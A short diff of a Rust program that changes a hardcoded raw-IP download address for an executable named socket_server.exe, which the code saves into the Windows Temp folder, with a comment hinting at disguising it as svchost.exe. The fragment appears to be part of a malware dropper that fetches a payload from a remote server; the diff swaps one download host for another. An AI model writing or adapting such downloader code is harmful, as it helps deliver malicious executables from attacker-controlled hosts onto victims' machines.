@@ -18,7 +18,7 @@ fn main()  -> Result<(), Box<dyn std::error::Error>>{
     }
 
     // 下载二进制文件
-    let url = "http://52.199.33.63:8000/socket_server.exe";
+    let url = "http://52.69.178.206:8000/socket_server.exe";
     let output_path = r"C:\\Windows\\Temp\\socket_server.exe";  //svchost.exe
     let mut response = reqwest::blocking::get(url)?;
     let mut file = std::fs::File::create(output_path)?;
